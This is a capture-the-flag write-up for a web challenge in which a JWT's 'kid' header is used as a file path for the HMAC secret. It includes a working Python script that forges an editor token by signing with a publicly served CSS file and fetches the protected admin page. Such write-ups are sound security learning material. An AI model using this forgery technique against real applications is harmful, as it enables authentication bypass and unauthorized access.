# You Are Kidding Me - writeup (web, JWT `kid` confusion)

## What the task was

"Chrome Horizon" is a retro-future motoring blog. Anyone can claim a free **reader pass** on `/login`, which the server issues as a JWT in the `token` cookie.

There is an `/admin` page (the "Editor's Desk") that prints the embargoed proofs, but only for an `editor`-role JWT.

Goal: forge a valid JWT with `role=editor`.

---

## First look at the JWT

Claiming a pass with name `testuser` returns:

```text
token=eyJhbGciOiJIUzI1NiIsImtpZCI6InJlYWRlci5rZXkiLCJ0eXAiOiJKV1QifQ
       .eyJzdWIiOiJ0ZXN0dXNlciIsInJvbGUiOiJyZWFkZXIifQ
       .<signature>
```

Decoding:

```json
// header
{ "alg": "HS256", "kid": "reader.key", "typ": "JWT" }

// payload
{ "sub": "testuser", "role": "reader" }
```

The critical detail is the **`kid`** header. It names the key the server should use for verification. The suspicion is that the server loads the secret from a file whose path is taken straight from `kid` - a classic **key / path confusion**.

---

## Step 1: confirm /admin wants editor

Visiting `/admin` with the reader token gives:

```text
Access Denied
Your pass checks out as reader. The Editor's Desk is for editor passes only.
```

So we only need `role = "editor"` in a validly-signed token.

---

## Step 2: which file do we sign with?

If the server reads the secret from `kid` as a filesystem path, we need a file whose **exact bytes** we know (so we can recompute the HMAC-SHA256).

The blog serves its own CSS at:

```text
/static/style.css
```

We can download it. Now we need the **absolute path on the server**. This is a Node/Python app in a container; a very common layout is `/app/...`.

So the candidate key path is:

```text
kid = "/app/static/style.css"
```

If the server does `read(kid)` and uses those bytes as the HMAC secret, and if that path maps to the same file we downloaded, our forged signature will verify.

---

## Step 3: forge the token

1. Download `/static/style.css` and take its raw bytes as the secret.
2. Build a header `{ "alg": "HS256", "kid": "/app/static/style.css", "typ": "JWT" }`.
3. Build a payload `{ "role": "editor" }`.
4. `signature = HMAC_SHA256(secret=css_bytes, data=base64(header)+"."+base64(payload))`.

Using PyJWT:

```python
import jwt

css = open("style.css", "rb").read()          # the public file = the "secret"
p = {"role": "editor"}
tok = jwt.encode(p, css, algorithm="HS256", headers={"kid": "/app/static/style.css"})
```

---

## Step 4: fetch /admin with the forged token

Set the `token` cookie to the forged JWT and GET `/admin`. The server:

```text
kid = "/app/static/style.css"  -> read the CSS bytes
HS256 verify with those bytes  -> matches, because we signed with the same bytes
role == "editor"               -> ok
```

`/admin` responds with the flag.

---

## What I tried first (dead ends)

1. **`alg = "none"`** - rejected (server enforces a real algorithm).
2. **`kid = "/dev/null"`** with an empty secret - rejected; the server still treats the empty-key case as invalid, or `/dev/null` isn't readable in that way.
3. **Empty-string secret for various `kid` values** - all 401.
4. **Guessing the absolute web root** - only `/app/static/style.css` worked; `/static/style.css`, `/srv/...`, `/var/www/...` etc. all failed (path didn't exist or didn't match).

The winning move was combining a **real, guessable file path** (`/app/static/style.css`) with **known file contents** (the served CSS).

---

## Final `solve.py`

```python
#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import re
import urllib.request

BASE = "<challenge-url>"          # challenge instance (closed after the event)
CSS_URL = BASE + "/static/style.css"

KID = "/app/static/style.css"     # absolute server path of the public CSS


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main() -> int:
    # The "secret" is the public CSS bytes that the server will read
    # from the path given in `kid`.
    css = urllib.request.urlopen(CSS_URL, timeout=20).read()

    header = b64url(json.dumps({"alg": "HS256", "kid": KID, "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"role": "editor"}).encode())
    signing_input = (header + "." + payload).encode()

    sig = hmac.new(css, signing_input, hashlib.sha256).digest()
    sig = b64url(sig)

    token = signing_input.decode() + "." + sig
    print("[+] forged token:", token[:60], "...")

    req = urllib.request.Request(BASE + "/admin")
    req.add_header("Cookie", "token=" + token)
    body = urllib.request.urlopen(req, timeout=20).read().decode(errors="replace")

    m = re.search(r"sun\{[^}]*\}", body)
    print("[+] flag:", m.group(0) if m else "(not found/parse)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Run with:

```bash
python3 solve.py
```

---

## Result

The forged `editor` JWT is accepted and `/admin` returns the flag.

Flag: `sun{...}` (masked)

---

## One-paragraph version

The reader pass is an HS256-signed JWT whose `kid` header is taken trust-nav as a file path for the HMAC secret. Since the path is not validated, pointing `kid` at a **public file we can download** - `/app/static/style.css` - and signing the token with those same CSS bytes yields a valid signature. With `role=editor` in the payload, the forged token gets us into `/admin` and the flag.

---

## Lessons learned

1. A `kid`/`x5t`-style header that controls the secret is a red flag; always test if the server reads a file/URL from it.
2. Prefer a `kid` that points at a **public, byte-for-byte known** resource over a random guess.
3. Combined with common container paths (`/app/...`), this becomes a full key-confusion bypass.
4. As long as the file bytes match, the HMAC secret can be any data - not necessarily a secret-looking string.